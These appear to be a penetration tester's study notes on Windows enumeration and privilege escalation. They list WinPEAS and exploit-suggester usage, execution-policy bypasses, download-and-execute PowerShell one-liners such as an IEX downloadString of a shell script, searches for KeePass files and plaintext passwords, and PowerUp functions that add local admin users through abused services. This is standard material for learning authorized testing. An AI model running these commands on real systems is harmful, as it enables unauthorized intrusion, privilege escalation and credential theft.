## Windows Enumeration

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Windows Privesc Checker](https://www.kali.org/tools/windows-privesc-check/)
- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Path fix

```
set PATH=C:\Windows;C:\Windows\system32;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;%PATH%

or 

set PATH=%SystemRoot%\system32;%SystemRoot%;

Get-ExecutionPolicy -List
Set-ExecutionPolicy Unrestricted
```
### Powershell location

```
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
### Writable Paths

```
C:\Windows\Temp

C:\Users\<USER>\Desktop\

C:\Users\Public\

C:\Documents and Settings\Public\

C:\Documents and Settings\<USER>\Desktop\
```
### PS styles

```
PS> $host

> powershell -c <cmd>

> powershell.exe -exec bypass -Command <>

```


### Cmds

```
# download file

certutil.exe -urlcache [-split] -f <source> <destination>

PS> wget <source> -OutFile <dest>

PS> Invoke-WebRequest -Uri <source> -Outfile <out-path>

powershell -c (New-Object System.Net.WebClient).downloadFile('<source>', '<dest>')

powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('/shell.ps1')

wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309

#run file

> ren <src> <dest>

PS> Start-Process <file.exe>

# rename

PS> Rename-Item -Path <file> -NewName <new-file>

# move

> copy /Y <src> <dest>

PS> Move-Item -Path <src> -Destination <dest>

# /E copies entire dir-structure

> robocopy <src> <dest> /E

# delete

PS> Remove-Item -Path <file> [-recursive]

```

### PS shorthand

```
# get child items

PS> gci [--recurse]

# get content

PS> gc FILE
```
### Arch based windows directory structure

| Session type   | 32 bit folder       | 64 bit folder         |
| -------------- | ------------------- | --------------------- |
| 32 bit session | C:\Windows\system32 | C:\Windows\sysNative\ |
| 64 bit session | C:\Windows\sysWOW64 | C:\Windows\system32\  |

### Manual

```

whoami # username/hostname
whoami /groups # check user is in which group

net user
net user <username>
Get-LocalUser # Powershell

net localgroup
net localgroup <groupname>
Get-localgroup # Powershell

systeminfo
netstat -ano

# Installed Apps # Powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process # Powershell - running process
Get-Process | Select ProcessName,Path # With Path

# Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Default xampp passwords
type C:\xampp\passwords.txt
type C:\xampp\mysql\bin\my.ini

# Change username
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-History # Powershell History
(Get-PSReadlineOption).HistorySavePath # Powershell History

```

### Automate

```

winPEASx86.exe or winPEASx64.exe are best

Then

windows-privesc-check2.exe

Otherwise,

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"

or

./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2'





```
### More Automate

### PowerUp

1. **Download and Import the Script:**
    
    - First, you need to download the `PowerUp.ps1` script from the PowerSploit repository. You can do this by cloning the PowerSploit repository from GitHub or by downloading the script directly.
        
    - Once you have the script, you can import it into your PowerShell session using the `Import-Module` cmdlet.
        
                
        `Import-Module ./Path/To/PowerUp.ps1`
        
2. **Run Functions to Find Vulnerabilities:**
    
    - `PowerUp.ps1` offers a variety of functions to check for common misconfigurations that can lead to privilege escalation. For example:
        
        - **Invoke-AllChecks:** This function runs all current escalation checks and returns a consolidated object with the results.
            
                        
            `Invoke-AllChecks`
            
        - **Get-ServiceUnquoted:** This function checks for services with unquoted paths that also have a space in their path. This can potentially lead to privilege escalation.
            
                        
            `Get-ServiceUnquoted`
            
        - **Write-UserAddMSI:** This function generates an MSI file in the specified path that prompts for installation. When installed, it adds a local or domain user with the specified username and password.
            
                        
            `Write-UserAddMSI -UserName "NewAdminUser" -Password "P@ssword!"`
            
1. **Write-ServiceBinary**: This function writes out a binary that adds a local admin user or executes a custom command when a service with an unquoted path (and a writable space in the path) is started.
    
        
    `Write-ServiceBinary -Name 'VulnerableServiceName' -Path 'C:\Path\To\Output\Binary.exe'`
    
2. **Invoke-ServiceAbuse**: This function abuses writable service binaries to write out a payload that adds a local admin user.
    
        
    `Invoke-ServiceAbuse -Name 'VulnerableServiceName' -UserName 'NewAdminUser'`
    
3. **Get-ModifiablePath**: This function finds paths that are modifiable by the current user and are in the system's PATH environment variable. This can be exploited if a service or application executes a binary from a directory that the user can write to.
    
        
    `Get-ModifiablePath`



### Reverse Engineering Files

```
You can use Ghidra or dnSpy
https://github.com/dnSpy/dnSpy

## Get File info
file UserInfo.exe


## Load dnSpy on Win box
```
![dnSpy](OSCP/OSCP-Notes/src/dnSpy.png)